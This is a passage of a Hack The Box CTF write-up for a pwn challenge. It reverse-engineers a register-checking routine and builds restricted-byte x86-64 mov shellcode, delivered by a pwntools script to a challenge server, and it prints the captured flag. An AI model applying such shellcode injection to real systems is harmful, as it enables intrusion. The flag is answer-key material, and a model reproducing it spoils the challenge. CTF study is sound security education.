+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠒⠚⠉⠉⠉⠉⠒⠻⢍⣉⠉⠒⢄⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠯⠖⠂⠀⠀⠈⠉⠙⠲⢄⡀⠀⠈⠑⢦⡀⢳⡠⠚⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⡀⠀⠀⠑⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⢠⠃⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⣾⢸⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢸⠹⡄⠀⠀⣻⠀⠀⠀⠀⠀⠀⠀⠀ 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⢰⡏⣿⣸⣷⠀⠀⣠⠀⠀⠀⠀⠀⡿⡀⢸⡇⣇⠀⠀⠇⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡷⠀⠀⢸⣷⡟⣿⠿⣆⣀⣷⣧⣖⣤⡄⣤⣷⡇⣼⠃⣿⣂⣼⠆⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣟⣆⣄⣸⣿⣿⣿⡆⢿⣦⣽⡿⣿⣿⣷⣿⣿⣷⣿⣼⡟⣦⢻⠀⢿⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣞⡾⢿⡿⠃⠀⠀⠀⠀⠙⠿⠿⢻⠁⠀⣾⣀⡝⣘⣼⠀⢸⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⢸⣿⣾⡁⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢺⠀⠀⣿⡟⢛⣽⠁⠀⣼⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠈⡇⣇⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⢸⠀⢼⣿⡟⢻⠋⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⣿⠘⢆⠀⠀⠀⠀⠤⠖⠁⠀⠀⢸⠀⣾⢹⠁⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⢹⠀⡌⣷⣄⡀⠐⠀⠀⠀⢀⡴⢾⠀⢹⣏⡀⢰⠀⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣸⠀⣧⡟⢹⡿⣦⣤⠶⠚⠁⠀⣿⢰⢸⡏⠱⣾⡀⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠴⠒⠚⣿⣿⠀⢹⢳⡾⠀⠀⠀⠀⠀⠀⠰⢿⣴⢸⠳⡾⢿⢇⢧⠀⢹⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⡴⠊⠁⠀⠀⠀⠀⠈⡟⠀⣿⠘⡇⠀⠀⠀⠀⠀⠀⠀⢸⡏⢸⡖⠁⡈⡏⠻⣧⣸⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⡞⠂⠀⠀⠀⠀⠀⠀⣠⡇⠀⣧⠀⢾⣄⡰⠄⠀⠀⡜⠀⢸⣴⣸⠀⠠⠟⡇⠠⡈⠙⢷⠦⣀⠀⠀⠀⠀
+⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⢀⡎⠀⣟⣆⡿⠂⢸⣣⠄⠀⠀⠀⠈⠉⡹⡇⢸⡀⢄⣠⣿⠀⠈⠧⠀⠀⠀⠑⢆⠀⠀
+⠀⠀⠀⠀⢹⠀⠀⠀⠀⡀⢀⡎⢀⠴⠿⢿⠃⠁⠀⡯⣆⠀⠀⠀⢀⠞⢹⢳⣸⣅⣀⣡⢹⡄⠀⠀⠀⠀⠀⠀⢘⡄⠀
+⠀⠀⠀⠀⢸⡀⠀⠀⠀⣧⣼⡾⠁⠀⠀⠀⠙⣴⠶⢇⡘⣄⢠⡴⠁⠀⢸⠏⠁⠀⠀⠘⢦⡇⢰⠀⠀⡄⠀⠀⠈⡧⠀
+⠀⠀⠀⠀⢸⣧⠀⠀⠀⣹⠟⡇⠀⠀⠀⠀⢀⡇⠘⠀⢹⣽⣏⣀⡀⣰⣯⠀⠀⠀⠀⠀⣸⢻⣶⡇⣰⠁⠀⠀⠀⡇⠀
+⠀⠀⠀⠀⢸⣿⣄⡠⡾⠁⠀⢙⣤⣀⣀⡤⠾⣅⠀⣰⡟⠉⣀⣈⠙⣟⣾⣦⣀⠀⣀⡤⠏⠀⣿⣴⠃⠀⠀⠀⣸⠇⠀
+⠀⠀⠀⠀⢈⡿⠖⢹⠁⠀⢀⠎⠁⢸⠋⠀⣠⠟⠛⢺⡀⠘⠿⠏⠀⢸⠷⠶⠏⢫⠉⠳⡀⠀⠘⢿⠀⠀⠀⢰⣿⠀⠀
+⠀⠀⠀⠀⡼⠀⠀⡇⠀⠀⣼⠀⠀⣿⣠⠞⠁⠀⠀⠈⢳⡦⠀⠀⢀⡞⠀⠀⠀⠘⡆⠀⣱⡀⠀⠈⡧⡴⠖⣸⣻⠀⠀
+⠀⠀⠀⢠⠃⠀⢠⡇⠀⠀⣿⢀⣿⣿⡁⠀⠀⠀⢀⠔⢫⣀⣤⣴⠏⠀⠀⠀⠀⠀⣷⠀⣿⣇⠀⠀⡇⠀⠀⡌⢹⠀⠀
+⠀⠀⠀⡾⠀⠀⠸⡇⠀⠀⠁⢀⠎⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠉⠀⠈⡇⠀⠀⡀⠸⡆⠀
+⠀⠀⢰⠃⠀⡤⠀⣿⣀⠀⢀⠏⠀⠀⠀⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠀⠀⠀⠀⣸⠇⠀⢠⠀⠠⡇⠀
+⠀⠀⡏⢀⠎⠀⠀⢻⡟⣦⡜⠀⠀⠀⢀⠏⠀⢠⣐⠤⠒⠁⠀⠀⠀⠀⠀⢀⡴⠋⢀⡀⠀⠀⣠⢿⠀⢀⡞⠀⠀⣧⠀
+⠀⢸⣷⠋⠀⢠⠃⠸⣿⣜⠃⠆⠀⠀⣎⡴⠖⠉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣋⠴⠖⠉⢀⡀⣠⣫⠇⠀⠸⠃⠀⠀⣿⡄
+⢠⡿⠁⠀⢠⠟⠀⢀⣿⣿⣸⡇⠀⣼⠉⠀⠀⠀⠀⠀⡀⠀⠀⠀⠴⠋⣉⡴⠄⢀⡴⠋⣰⣿⠟⠀⠀⠀⠀⠀⣸⣿⡇
+⢸⠇⠀⡰⠃⠀⠀⣼⣿⣿⠋⠉⠓⠫⠿⢿⠒⠒⠚⠯⠥⠤⠦⠭⠵⠾⠯⢤⡺⠿⠗⠚⣿⣿⠀⠀⠀⠀⠀⢠⢿⢽⡗
+⠀⠀⠀⠀⠀⠘⡿⣿⣿⡟⠙⠲⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⢰⣿⣿⣄⣀⠀⠀⠀⣼⣿⡿⠃
+⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠒⠉⠙⠛⠭⣅⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡛⠛⠛⠀⠀⠀⠀⠁⠉⠀⠀
+
+[*] <span class="hljs-symbol">Initializing</span> components...
+
+[-] <span class="hljs-symbol">Error</span>: <span class="hljs-symbol">Misaligned</span> components!
+
+[*] <span class="hljs-symbol">If</span> you intend to fix them, type <span class="hljs-string">&quot;fix&quot;</span>: fix
+
+[!] <span class="hljs-symbol">Carefully</span> place all the components:
+[-] <span class="hljs-symbol">Value</span> of [ $r8 ]: [ <span class="hljs-number">0xffffffff</span> ]
+
+[+] <span class="hljs-symbol">Correct</span> value: [ <span class="hljs-number">0x1337c0de</span> ]
+</code></pre>
+<p>Notice how it show the current value in register <code>r8</code> and its correct value. This means we have craft ASM instructions that put the correct value to the corresponding register.</p>
+<p>&lt;br&gt;</p>
+<p>Let's take a look at where we are in the code to get this output in <code>check()</code> :</p>
+<pre><code class="hljs language-c"><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)
+{
+    <span class="hljs-keyword">if</span> (var_79 &gt; <span class="hljs-number">6</span>)
+    {
+        result = <span class="hljs-number">1</span>;
+        <span class="hljs-keyword">break</span>;
+    }
+    
+    <span class="hljs-type">int64_t</span> r12;
+    <span class="hljs-type">int64_t</span> r13;
+    <span class="hljs-type">int64_t</span> r14;
+    <span class="hljs-type">int64_t</span> r15;
+    
+    <span class="hljs-keyword">if</span> (regs(&amp;buf[((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79))], r12, r13, r14, r15) != *(<span class="hljs-type">uint64_t</span>*)((((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79)) &lt;&lt; <span class="hljs-number">3</span>) + &amp;values))
+    {
+        <span class="hljs-type">int64_t</span> rbx_2 = *(<span class="hljs-type">uint64_t</span>*)((((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79)) &lt;&lt; <span class="hljs-number">3</span>) + &amp;values);
+        <span class="hljs-type">int64_t</span> rax_17 = regs(&amp;buf[((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79))], r12, r13, r14, r15);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n[-] Value of [ %s$%s%s ]: [ …&quot;</span>, <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;35m&quot;</span>, &amp;buf[((<span class="hljs-type">int64_t</span>)((<span class="hljs-type">uint32_t</span>)var_79))], <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;35m&quot;</span>, rax_17, <span class="hljs-string">&quot;\x1b[1;31m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;32m&quot;</span>, <span class="hljs-string">&quot;\x1b[1;33m&quot;</span>, rbx_2, <span class="hljs-string">&quot;\x1b[1;32m&quot;</span>);
+        result = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">break</span>;
+    }
+    
+    var_79 += <span class="hljs-number">1</span>;
+}
+</code></pre>
+<p>The output string in the code get shorten out in Binary Ninja, here's the full printf string: <code>&quot;%s\n[-] Value of [ %s$%s%s ]: [ %s0x%lx%s ]%s\n\n&quot;   &quot;[+] Correct value: [ %s0x%lx%s ]\n\n&quot;</code> .</p>
+<p>Disclaimer: The predefined value of the registers actually exist on the dissassembly, specifically the <code>&amp;values</code>. I only figured this out after the competition. Which is why I had to figure out each ASM instructions interatively to slowly get the correct values for every registers. If we know the <code>&amp;values</code> ahead, we can figure out every instructions at once.</p>
+<p>&lt;br&gt;</p>
+<p>To summarize, what <code>regs()</code> is doing, is just going through a predefined list of registers, specifically <code>r8, r9, r10, r12, r13, r14, r15</code>, and check if the registers has the correct predefined value. We can also see the endless loop stop when the counter variable <code>var79</code> get bigger than 6, which indicate we have to get all the the 7 registers <code>r8, r9, r10, r12, r13, r14, r15</code> get its values correct to finally reach <code>read_flag()</code> in <code>main()</code> .</p>
+<p>=&gt; We can do this with ASM <code>mov</code> instruction! We just need to make sure the instruction is make with opcode and operands from the list of allow_bytes</p>
+<p>Here's the two references links I used for this:</p>
+<p><a href="http://ref.x86asm.net/coder64.html#:~:text=coder64.html%23x-,32/64%2Dbit%20ModR/M%20Byte,-REX.R%3D1" target="_blank" rel="noopener noreferrer">References for register operands and opcode</a></p>
+<p><a href="https://c9x.me/x86/html/file_module_x86_id_176.html" target="_blank" rel="noopener noreferrer">Mov instruction</a></p>
+<p>I don't want to keep this write up too long, which is why I'm just going to briefly explain the <code>mov</code> instruction with two difference ways to represnet in the opcode that we use in the exploit payload. I do recommend reading more on it to understand it, and why it's being used, as I found it's really interesting.</p>
+<p>I also later found out you can do all of this with just the <code>asm()</code> function from the <code>pwn</code> library, and not having to go through the process of figuring out the opcode for the <code>mov</code> instruction. :)</p>
+<p>From those references, we now know:</p>
+<p>The byte <code>49</code> is setting <code>REX.W</code> and <code>REX.B</code> to 1 (this allow us to use 64-bit operands and extend reggisters <code>r8 - r15</code>).</p>
+<p><code>mov</code> in ModR/M Byte memory addressing mode requires a lot more number of bytes to represent the instruction, but we should avoid this mode whenever possible, because the <code>inputBuffer</code> memory was only limited to 60 characters, going past this will result in bad instruction/illegal instruction.</p>
+<p><code>mov</code> in SIB Byte memory addressing mode requires less bytes, but some register's bytes in this mode are not on the <code>allowed_bytes</code> list, hence why we need ModR/M.</p>
+<p>=&gt; Here's the instruction in bytes that I used, and its ASM equivalent :</p>
+<pre><code class="hljs"><span class="hljs-attribute">OPCODE</span>                                ASM                        MEMORY ADDRESSING MODE
+<span class="hljs-attribute">49</span> c7 c0 de c0 <span class="hljs-number">37</span> <span class="hljs-number">13</span>            -&gt;     mov r8 , <span class="hljs-number">0</span>x1337c0de                     SIB Byte
+    
+<span class="hljs-attribute">49</span> b9 ef be ad de <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>   -&gt;     mov r9 , <span class="hljs-number">0</span>xdeadbeef                    ModR/M Byte
+    
+<span class="hljs-attribute">49</span> ba <span class="hljs-number">37</span> <span class="hljs-number">13</span> ad de <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>   -&gt;     mov r10, <span class="hljs-number">0</span>xdead1337                    ModR/M Byte
+    
+<span class="hljs-attribute">49</span> c7 c4 fe ca <span class="hljs-number">37</span> <span class="hljs-number">13</span>            -&gt;     mov r12, <span class="hljs-number">0</span>x1337cafe                     SIB Byte
+    
+<span class="hljs-attribute">49</span> bd de c0 ef be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>   -&gt;     mov r13, <span class="hljs-number">0</span>xbeefc0de                    ModR/M Byte
+    
+<span class="hljs-attribute">49</span> c7 c6 <span class="hljs-number">37</span> <span class="hljs-number">13</span> <span class="hljs-number">37</span> <span class="hljs-number">13</span>            -&gt;     mov r14, <span class="hljs-number">0</span>x13371337                     SIB Byte
+    
+<span class="hljs-attribute">49</span> c7 c7 ad de <span class="hljs-number">37</span> <span class="hljs-number">13</span>            -&gt;     mov r15, <span class="hljs-number">0</span>x1337dead                     SIB Byte
+
+<span class="hljs-attribute">c3</span>                              -&gt;     ret
+</code></pre>
+<p>Note how many bytes we need for ModR/M Byte, I actually got stuck quite a while at register <code>r14</code> due to I was using ModR/M mode while there's a SIB mode equivalent available, and that cause the whole payload to exceed 60 chars, which mean the r15 instruction is missing the necessary bytes</p>
+<p>&lt;br&gt;</p>
+<p>Update the <code>payload</code> in <code>payload.py</code> and run it, which give me the flag in the output:</p>
+<pre><code class="hljs">⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⢤⣀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠈⢳⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡼⠃⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠒⠚⠉⠉⠉⠉⠒⠻⢍⣉⠉⠒⢄⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠯⠖⠂⠀⠀⠈⠉⠙⠲⢄⡀⠀⠈⠑⢦⡀⢳⡠⠚⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⡀⠀⠀⠑⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⢠⠃⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⣾⢸⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢸⠹⡄⠀⠀⣻⠀⠀⠀⠀⠀⠀⠀⠀ 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⢰⡏⣿⣸⣷⠀⠀⣠⠀⠀⠀⠀⠀⡿⡀⢸⡇⣇⠀⠀⠇⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡷⠀⠀⢸⣷⡟⣿⠿⣆⣀⣷⣧⣖⣤⡄⣤⣷⡇⣼⠃⣿⣂⣼⠆⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣟⣆⣄⣸⣿⣿⣿⡆⢿⣦⣽⡿⣿⣿⣷⣿⣿⣷⣿⣼⡟⣦⢻⠀⢿⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣞⡾⢿⡿⠃⠀⠀⠀⠀⠙⠿⠿⢻⠁⠀⣾⣀⡝⣘⣼⠀⢸⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⢸⣿⣾⡁⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢺⠀⠀⣿⡟⢛⣽⠁⠀⣼⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠈⡇⣇⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⢸⠀⢼⣿⡟⢻⠋⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⣿⠘⢆⠀⠀⠀⠀⠤⠖⠁⠀⠀⢸⠀⣾⢹⠁⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⢹⠀⡌⣷⣄⡀⠐⠀⠀⠀⢀⡴⢾⠀⢹⣏⡀⢰⠀⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣸⠀⣧⡟⢹⡿⣦⣤⠶⠚⠁⠀⣿⢰⢸⡏⠱⣾⡀⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠴⠒⠚⣿⣿⠀⢹⢳⡾⠀⠀⠀⠀⠀⠀⠰⢿⣴⢸⠳⡾⢿⢇⢧⠀⢹⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⡴⠊⠁⠀⠀⠀⠀⠈⡟⠀⣿⠘⡇⠀⠀⠀⠀⠀⠀⠀⢸⡏⢸⡖⠁⡈⡏⠻⣧⣸⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⡞⠂⠀⠀⠀⠀⠀⠀⣠⡇⠀⣧⠀⢾⣄⡰⠄⠀⠀⡜⠀⢸⣴⣸⠀⠠⠟⡇⠠⡈⠙⢷⠦⣀⠀⠀⠀⠀
+⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⢀⡎⠀⣟⣆⡿⠂⢸⣣⠄⠀⠀⠀⠈⠉⡹⡇⢸⡀⢄⣠⣿⠀⠈⠧⠀⠀⠀⠑⢆⠀⠀
+⠀⠀⠀⠀⢹⠀⠀⠀⠀⡀⢀⡎⢀⠴⠿⢿⠃⠁⠀⡯⣆⠀⠀⠀⢀⠞⢹⢳⣸⣅⣀⣡⢹⡄⠀⠀⠀⠀⠀⠀⢘⡄⠀
+⠀⠀⠀⠀⢸⡀⠀⠀⠀⣧⣼⡾⠁⠀⠀⠀⠙⣴⠶⢇⡘⣄⢠⡴⠁⠀⢸⠏⠁⠀⠀⠘⢦⡇⢰⠀⠀⡄⠀⠀⠈⡧⠀
+⠀⠀⠀⠀⢸⣧⠀⠀⠀⣹⠟⡇⠀⠀⠀⠀⢀⡇⠘⠀⢹⣽⣏⣀⡀⣰⣯⠀⠀⠀⠀⠀⣸⢻⣶⡇⣰⠁⠀⠀⠀⡇⠀
+⠀⠀⠀⠀⢸⣿⣄⡠⡾⠁⠀⢙⣤⣀⣀⡤⠾⣅⠀⣰⡟⠉⣀⣈⠙⣟⣾⣦⣀⠀⣀⡤⠏⠀⣿⣴⠃⠀⠀⠀⣸⠇⠀
+⠀⠀⠀⠀⢈⡿⠖⢹⠁⠀⢀⠎⠁⢸⠋⠀⣠⠟⠛⢺⡀⠘⠿⠏⠀⢸⠷⠶⠏⢫⠉⠳⡀⠀⠘⢿⠀⠀⠀⢰⣿⠀⠀
+⠀⠀⠀⠀⡼⠀⠀⡇⠀⠀⣼⠀⠀⣿⣠⠞⠁⠀⠀⠈⢳⡦⠀⠀⢀⡞⠀⠀⠀⠘⡆⠀⣱⡀⠀⠈⡧⡴⠖⣸⣻⠀⠀
+⠀⠀⠀⢠⠃⠀⢠⡇⠀⠀⣿⢀⣿⣿⡁⠀⠀⠀⢀⠔⢫⣀⣤⣴⠏⠀⠀⠀⠀⠀⣷⠀⣿⣇⠀⠀⡇⠀⠀⡌⢹⠀⠀
+⠀⠀⠀⡾⠀⠀⠸⡇⠀⠀⠁⢀⠎⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠉⠀⠈⡇⠀⠀⡀⠸⡆⠀
+⠀⠀⢰⠃⠀⡤⠀⣿⣀⠀⢀⠏⠀⠀⠀⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠀⠀⠀⠀⣸⠇⠀⢠⠀⠠⡇⠀
+⠀⠀⡏⢀⠎⠀⠀⢻⡟⣦⡜⠀⠀⠀⢀⠏⠀⢠⣐⠤⠒⠁⠀⠀⠀⠀⠀⢀⡴⠋⢀⡀⠀⠀⣠⢿⠀⢀⡞⠀⠀⣧⠀
+⠀⢸⣷⠋⠀⢠⠃⠸⣿⣜⠃⠆⠀⠀⣎⡴⠖⠉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣋⠴⠖⠉⢀⡀⣠⣫⠇⠀⠸⠃⠀⠀⣿⡄
+⢠⡿⠁⠀⢠⠟⠀⢀⣿⣿⣸⡇⠀⣼⠉⠀⠀⠀⠀⠀⡀⠀⠀⠀⠴⠋⣉⡴⠄⢀⡴⠋⣰⣿⠟⠀⠀⠀⠀⠀⣸⣿⡇
+⢸⠇⠀⡰⠃⠀⠀⣼⣿⣿⠋⠉⠓⠫⠿⢿⠒⠒⠚⠯⠥⠤⠦⠭⠵⠾⠯⢤⡺⠿⠗⠚⣿⣿⠀⠀⠀⠀⠀⢠⢿⢽⡗
+⠀⠀⠀⠀⠀⠘⡿⣿⣿⡟⠙⠲⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⢰⣿⣿⣄⣀⠀⠀⠀⣼⣿⡿⠃
+⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠒⠉⠙⠛⠭⣅⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡛⠛⠛⠀⠀⠀⠀⠁⠉⠀⠀
+
+[*] Initializing components...
+
+[-] Error: Misaligned components!
+
+[*] If you intend <span class="hljs-keyword">to</span> fix them<span class="hljs-punctuation">,</span> <span class="hljs-keyword">type</span> <span class="hljs-string">&quot;fix&quot;</span>: fix
+
+[!] Carefully place all the components:
+HTB{r<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>n<span class="hljs-number">5</span>truct_d<span class="hljs-number">3</span>m_r<span class="hljs-number">3</span>g<span class="hljs-number">5</span>_<span class="hljs-number">304</span>b<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">6210</span>fb<span class="hljs-number">9303</span>a<span class="hljs-number">89</span>d<span class="hljs-number">09855</span>bc<span class="hljs-number">761</span>}
+</code></pre>
+<p>&lt;br&gt;</p>
+<p>THE FLAG: HTB{r3c0n5truct_d3m_r3g5_304b5c3c6210fb9303a89d09855bc761}</p>
+<p>&lt;br&gt; &lt;br&gt;</p>
+<p>The final <code>payload.py</code> :</p>
+<pre><code class="hljs language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># Remote connection details</span>
+host = <span class="hljs-string">&quot;94.237.50.250&quot;</span>
+port = <span class="hljs-number">54813</span>
+
+<span class="hljs-comment"># Payload to send after &#x27;ts: &#x27;</span>
+payload = <span class="hljs-string">b&#x27;\x49\xc7\xc0\xde\xc0\x37\x13\x49\xb9\xef\xbe\xad\xde\x00\x00\x00\x00\x49\xba\x37\x13\xad\xde\x00\x00\x00\x00\x49\xc7\xc4\xfe\xca\x37\x13\x49\xbd\xde\xc0\xef\xbe\x00\x00\x00\x00\x49\xc7\xc6\x37\x13\x37\x13\x49\xc7\xc7\xad\xde\x37\x13&#x27;</span> + <span class="hljs-string">b&#x27;\xc3&#x27;</span> * <span class="hljs-number">25</span>
+
+<span class="hljs-comment"># Connect to the remote host</span>
+conn = remote(host, port)
+
+<span class="hljs-comment"># Wait for &#x27;x&quot;: &#x27; and send &quot;fix&quot;</span>
+output = conn.recvuntil(<span class="hljs-string">b&#x27;x&quot;: &#x27;</span>)
+<span class="hljs-built_in">print</span>(output.decode())
+conn.sendline(<span class="hljs-string">b&#x27;fix&#x27;</span>)
+
+<span class="hljs-comment"># Wait for &#x27;ts: &#x27; and send the payload</span>
+output = conn.recvuntil(<span class="hljs-string">b&#x27;ts: &#x27;</span>)
+<span class="hljs-built_in">print</span>(output.decode())
+conn.send(payload)
+
+output = conn.recv()
+<span class="hljs-built_in">print</span>(output.decode())
+</code></pre>
+</div> </section>  <section data-astro-cid-sz7xmlte> <p data-astro-cid-sz7xmlte>
+Last Updated in 2025<br data-astro-cid-sz7xmlte>
+Halifax, NS<br data-astro-cid-sz7xmlte>
+Canada
+</p> </section>  </body></html> 
